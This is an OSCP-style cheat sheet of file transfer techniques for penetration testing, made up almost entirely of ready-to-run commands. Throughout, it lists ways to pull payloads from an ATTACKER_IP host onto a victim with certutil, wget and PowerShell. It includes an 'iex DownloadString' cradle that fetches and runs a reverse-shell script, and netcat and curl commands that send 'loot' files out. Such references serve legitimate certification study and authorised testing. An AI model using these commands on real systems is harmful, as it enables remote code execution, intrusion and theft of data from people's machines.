# OSCP File Transfer Methods Cheat Sheet

## 1. Python HTTP Server (Most Common)

### Start Server
```bash
python3 -m http.server 8000
```
```bash
python -m SimpleHTTPServer 8000
```

### Download from Linux
```bash
wget http://ATTACKER_IP:8000/file
curl -O http://ATTACKER_IP:8000/file
```

### Download from Windows
```powershell
Invoke-WebRequest -Uri http://ATTACKER_IP:8000/file -OutFile file
```
```powershell
powershell -c "(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP/file','file')"
```

---

## 2. SCP Transfers

### Local → Remote
```bash
scp file user@TARGET:/tmp/
```

### Remote → Local
```bash
scp user@TARGET:/tmp/file .
```

### Windows → Linux
```powershell
scp C:\path\file.txt kali@ATTACKER_IP:/home/kali/
```

---

## 3. SMB (Windows Shares)

### Start SMB Server
```bash
impacket-smbserver share ./ -smb2support
```

### Windows Victim
```cmd
copy \ATTACKER_IP\share\file.exe C:\Temp\file.exe
```

---

## 4. Netcat File Transfer

### Send File (Victim → Attacker)
```bash
nc ATTACKER_IP 4444 < file
```

### Receive File
```bash
nc -lvnp 4444 > file
```

---

## 5. Base64 Transfers

### Encode (Attacker)
```bash
base64 file > file.b64
```

### Decode (Linux)
```bash
base64 -d file.b64 > file
```

### Decode (Windows)
```powershell
certutil -decode file.b64 file.exe
```

---

## 6. certutil (Windows Built-In)

### Direct Download
```cmd
certutil -urlcache -f http://ATTACKER_IP/file.exe file.exe
```

### Base64 Decode
```cmd
certutil -decode in.b64 out.exe
```

---

## 7. FTP Transfers

### Start Server
```bash
python3 -m pyftpdlib --port 21 --write
```

### Windows
```cmd
ftp ATTACKER_IP
get file.exe
put loot.txt
```

---

## 8. PowerShell Download Cradles

```powershell
(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP/file','file')
```

```powershell
iwr -Uri http://ATTACKER_IP/file -OutFile file
```

```powershell
iex (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/rev.ps1')
```

---

## 9. TFTP (Legacy Windows)

### Windows
```cmd
tftp -i ATTACKER_IP GET file.exe
```

---

## 10. SFTP

```bash
sftp user@TARGET
get file
put payload
```

---

## 11. Upload Via curl/wget (Victim → Attacker)

### Upload from victim
```bash
curl -X PUT --upload-file file http://ATTACKER_IP:8000/upload
```

---

## 12. Reverse File Transfer

### Victim → Attacker
```bash
nc ATTACKER_IP 4444 < loot.txt
```

### Attacker receives
```bash
nc -lvnp 4444 > loot.txt
```

---

## 13. Restricted-Webshell Transfer (Echo Method)

```bash
echo <base64 chunk> >> file.b64
```

---

## Quick Table

| Method | OS | Notes |
|--------|----|-------|
| Python HTTP server | Win/Linux | Most reliable |
| PowerShell IWR | Windows | Fast + built-in |
| certutil | Windows | Great fallback |
| SCP | Linux/Win | Needs SSH |
| SMB | Windows | Easy share |
| Netcat | Both | Simple/fast |
| Base64 | Everywhere | Works with restrictions |

